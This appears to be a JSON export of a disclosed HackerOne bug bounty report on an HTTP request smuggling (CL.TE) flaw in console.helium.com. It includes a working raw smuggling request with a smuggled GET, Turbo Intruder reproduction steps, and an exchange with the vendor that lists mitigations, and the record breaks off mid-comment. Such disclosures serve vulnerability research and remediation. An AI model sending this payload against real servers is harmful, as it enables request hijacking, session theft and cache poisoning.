{"id":867952,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Njc5NTI=","url":"https://hackerone.com/reports/867952","title":"HTTP request Smuggling","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-05-07T10:07:59.993Z","submitted_at":"2020-05-07T10:07:59.993Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dracomalfoy","url":"/dracomalfoy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":12172,"url":"https://hackerone.com/helium","handle":"helium","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/172/c6ee5425ee5cb13a9616336667e01488d68f161f_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/172/c6ee5425ee5cb13a9616336667e01488d68f161f_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Helium","twitter_handle":"helium","website":"http://www.helium.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-02T05:43:30.090Z","bug_reporter_agreed_on_going_public_at":"2020-06-02T05:43:13.743Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to \"smuggle\" a request to one device without the other device being aware of it. \n\nconsole.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.\n\n##Products affected:\n\nHelium console Website. :  console.helium.com\n\n##Steps To Reproduce:\n\n1. Run the burp suite turbo intruder on the following request\n\n```\n\nPOST /api/sessions HTTP/1.1\nHost: console.helium.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://console.helium.com/login\nContent-Type: application/json\nContent-Length: 109\nDNT: 1\nConnection: close\nCookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9\nTransfer-Encoding: chunked\n\n39\n{\"session\":{\"email\":\"fdsfsd@fgd.jk\",\"password\":\"sdfsdf\"}}\n00\n\nGET / HTTP/1.1\nHost: www.helium.com\nfoo: x\n\n\n```\n\n2. Script for tubro Intruder is attached. Word list can be any list containing any characters.\n\n3. Observe 200 Ok response for the /api/sessions post request which is supposed to give  401 Unauthorized   {\"errors\":{\"error\":[\"The email address or password you entered is not valid\"]}} Please refer the attached screenshot ( Smuggle Request1.png ) which contain the expected response. \n\n4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A recoding is attached as well.\n\nAny suggestions or improvement in reports are welcome\n\n## Impact\n\nIt is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation and cache poisoning can be the impact of this vulnerability as well. Self-Xss can be escalated to XSS. It can be chained with other vulnerabilities to raise their severity.\nAs unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.\n\nFor more information about the vulnerability please refer :\nhttps://cwe.mitre.org/data/definitions/444.html ;\nhttps://capec.mitre.org/data/definitions/33.html","vulnerability_information_html":"\u003cp\u003eWhen malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to \u0026quot;smuggle\u0026quot; a request to one device without the other device being aware of it. \u003c/p\u003e\n\n\u003cp\u003econsole.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.\u003c/p\u003e\n\n\u003ch2 id=\"products-affected\"\u003eProducts affected:\u003c/h2\u003e\n\n\u003cp\u003eHelium console Website. :  console.helium.com\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eRun the burp suite turbo intruder on the following request\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nPOST /api/sessions HTTP/1.1\nHost: console.helium.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://console.helium.com/login\nContent-Type: application/json\nContent-Length: 109\nDNT: 1\nConnection: close\nCookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9\nTransfer-Encoding: chunked\n\n39\n{\u0026quot;session\u0026quot;:{\u0026quot;email\u0026quot;:\u0026quot;fdsfsd@fgd.jk\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;sdfsdf\u0026quot;}}\n00\n\nGET / HTTP/1.1\nHost: www.helium.com\nfoo: x\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eScript for tubro Intruder is attached. Word list can be any list containing any characters.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eObserve 200 Ok response for the /api/sessions post request which is supposed to give  401 Unauthorized   {\u0026quot;errors\u0026quot;:{\u0026quot;error\u0026quot;:[\u0026quot;The email address or password you entered is not valid\u0026quot;]}} Please refer the attached screenshot ( Smuggle Request1.png ) which contain the expected response. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThis successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A recoding is attached as well.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAny suggestions or improvement in reports are welcome\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation and cache poisoning can be the impact of this vulnerability as well. Self-Xss can be escalated to XSS. It can be chained with other vulnerabilities to raise their severity.\u003cbr\u003e\nAs unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.\u003c/p\u003e\n\n\u003cp\u003eFor more information about the vulnerability please refer :\u003cbr\u003e\n\u003ca title=\"https://cwe.mitre.org/data/definitions/444.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F444.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/444.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ;\u003cbr\u003e\n\u003ca title=\"https://capec.mitre.org/data/definitions/33.html\" href=\"/redirect?url=https%3A%2F%2Fcapec.mitre.org%2Fdata%2Fdefinitions%2F33.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://capec.mitre.org/data/definitions/33.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":819006,"file_name":"intruder.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b5rQEozsUsK21zQ2oJYf84NV?response-content-disposition=attachment%3B%20filename%3D%22intruder.txt%22%3B%20filename%2A%3DUTF-8%27%27intruder.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070340Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=88e0fe3ee65ac5d1b878affb95dd72da4a675333b70b7e425dea64bbc8cfe2ba","file_size":571,"type":"text/plain"},{"id":819022,"file_name":"Smuggle_Request1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ogF6gJPGRQeGYZSVkRJ4P4zE?response-content-disposition=attachment%3B%20filename%3D%22Smuggle_Request1.png%22%3B%20filename%2A%3DUTF-8%27%27Smuggle_Request1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070340Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=e4493fa6808120220d0ffa710d07ee6445d4074103129ce8579e77802ed049fc","file_size":155903,"type":"image/png"},{"id":819024,"file_name":"Final_Response..png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AR7scbqYH6v4ReC2U6ZMZA3y?response-content-disposition=attachment%3B%20filename%3D%22Final_Response..png%22%3B%20filename%2A%3DUTF-8%27%27Final_Response..png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070340Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=7be11dd04407aa41a59b00aa852d0faf64dbf5403e386e9e0fb0f48276f1a7c5","file_size":194026,"type":"image/png"},{"id":819032,"file_name":"helium_http_smuggling_.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zb4sjKmBWGLvNHK3jffQof5B?response-content-disposition=attachment%3B%20filename%3D%22helium_http_smuggling_.mp4%22%3B%20filename%2A%3DUTF-8%27%27helium_http_smuggling_.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070340Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=ee474e5558a4e18f465148c479b54b683f648a385f0ef1e1100e5275afb18054","file_size":2988146,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-07-02T05:43:13.972Z","allow_singular_disclosure_after":-15556826.159286063,"singular_disclosure_allowed":true,"vote_count":274,"voters":["sl1979","sat0shi","nirajgautamit","un4gi","mik317","hannanhaseeb","zonduu","prophet","flag_c0","hardlane","and 264 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":43253,"asset_type":"URL","asset_identifier":"console.helium.com","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7958964,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Team,\nAny updates on this ?","markdown_message":"\u003cp\u003eHi Team,\u003cbr\u003e\nAny updates on this ?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-11T09:41:44.667Z","updated_at":"2020-05-11T09:41:44.667Z","actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7966339,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-11T18:44:06.056Z","updated_at":"2020-05-11T18:44:06.056Z","actor":{"username":"jdgemm","cleared":false,"url":"/jdgemm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7968271,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there, thanks for this interesting bug submission. Would you be able to explain how this bug would be exploited on console.helium.com, with a use case? Your second request goes to a separate subdomain, which does not in itself present any risks to console. ","markdown_message":"\u003cp\u003eHi there, thanks for this interesting bug submission. Would you be able to explain how this bug would be exploited on console.helium.com, with a use case? Your second request goes to a separate subdomain, which does not in itself present any risks to console. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-11T22:17:44.930Z","updated_at":"2020-05-11T22:17:44.930Z","actor":{"username":"victormu","cleared":false,"url":"/victormu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7970075,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, i choosed the second domain because i want to make the defferences between smuggled request and the original request clear. We can change the host header to the \"console.helium.com\" and we will get the response of that subdomain.\nAs i had already mentioned in Impact, this could lead to serious exploitations like session hijacking, priviledge escalation, cache poisoning etc. It can expose the front-end header rewriting. And the most dangerous part is that attacker does not need the victim to take any action. Victim will be unaware of any attack.\nHere is an article ablout it by James kettle.\nhttps://portswigger.net/research/http-desync-attacks-request-smuggling-reborn","markdown_message":"\u003cp\u003eWell, i choosed the second domain because i want to make the defferences between smuggled request and the original request clear. We can change the host header to the \u0026quot;console.helium.com\u0026quot; and we will get the response of that subdomain.\u003cbr\u003e\nAs i had already mentioned in Impact, this could lead to serious exploitations like session hijacking, priviledge escalation, cache poisoning etc. It can expose the front-end header rewriting. And the most dangerous part is that attacker does not need the victim to take any action. Victim will be unaware of any attack.\u003cbr\u003e\nHere is an article ablout it by James kettle.\u003cbr\u003e\n\u003ca title=\"https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fhttp-desync-attacks-request-smuggling-reborn\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-12T04:33:19.351Z","updated_at":"2020-05-12T04:33:19.351Z","actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7991333,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"so what is the expected fix in your opinion? we use cloudflare which is already supposed to rewrite headers to prevent situations like this.","markdown_message":"\u003cp\u003eso what is the expected fix in your opinion? we use cloudflare which is already supposed to rewrite headers to prevent situations like this.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-13T16:42:58.442Z","updated_at":"2020-05-13T16:42:58.442Z","actor":{"username":"victormu","cleared":false,"url":"/victormu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7993574,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HTTP request smuggling vulnerabilities arise in situations where a front-end server forwards multiple requests to a back-end server over the same network connection, and the protocol used for the back-end connections carries the risk that the two servers disagree about the boundaries between requests. Some generic ways to prevent HTTP request smuggling vulnerabilities arising are as follows:\n\n1. Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.\n2. Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.\n3. Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests. \n\nIn some cases, vulnerabilities can be avoided by making the front-end server normalize ambiguous requests or making the back-end server reject ambiguous requests and close the network connection. However, these approaches are potentially more error-prone than the generic mitigations identified above.\n\nSource : https://portswigger.net/web-security/request-smuggling","markdown_message":"\u003cp\u003eHTTP request smuggling vulnerabilities arise in situations where a front-end server forwards multiple requests to a back-end server over the same network connection, and the protocol used for the back-end connections carries the risk that the two servers disagree about the boundaries between requests. Some generic ways to prevent HTTP request smuggling vulnerabilities arising are as follows:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eDisable reuse of back-end connections, so that each back-end request is sent over a separate network connection.\u003c/li\u003e\n\u003cli\u003eUse HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.\u003c/li\u003e\n\u003cli\u003eUse exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests. \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIn some cases, vulnerabilities can be avoided by making the front-end server normalize ambiguous requests or making the back-end server reject ambiguous requests and close the network connection. However, these approaches are potentially more error-prone than the generic mitigations identified above.\u003c/p\u003e\n\n\u003cp\u003eSource : \u003ca title=\"https://portswigger.net/web-security/request-smuggling\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fweb-security%2Frequest-smuggling\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/web-security/request-smuggling\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-13T20:11:01.078Z","updated_at":"2020-05-13T20:11:01.078Z","actor":{"username":"dracomalfoy","cleared":false,"url":"/dracomalfoy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8014845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"can you make a smuggled request that doesn't use a second domain, but uses console.helium.com for the second request instead? I don't believe it will work","markdown_message":"\u003cp\u003ecan you make a smuggled request that doesn\u0026#39;t use a second domain, but uses console.helium.com for the second request instead? I don\u0026#39;t believe it will work\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-15T19:07:28.775Z","updated_at":"2020-05-15T19:07:28.775Z","actor":{"username":"victormu","cleared":false,"url":"/victormu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"helium","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8025213,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @victormu ,\nI cant found the login request to 